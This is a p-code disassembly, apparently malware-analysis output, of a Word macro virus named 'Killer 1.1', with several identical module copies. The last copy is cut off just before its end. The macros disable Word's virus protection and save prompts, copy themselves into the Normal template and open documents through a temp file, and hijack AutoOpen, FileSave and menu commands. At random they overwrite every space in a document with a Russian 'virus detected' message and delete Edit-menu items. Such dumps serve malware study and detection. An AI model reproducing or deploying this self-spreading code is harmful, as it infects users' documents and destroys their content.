' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer7 - 5346 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer8 - 4762 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer9 - 5394 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer10 - 4547 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
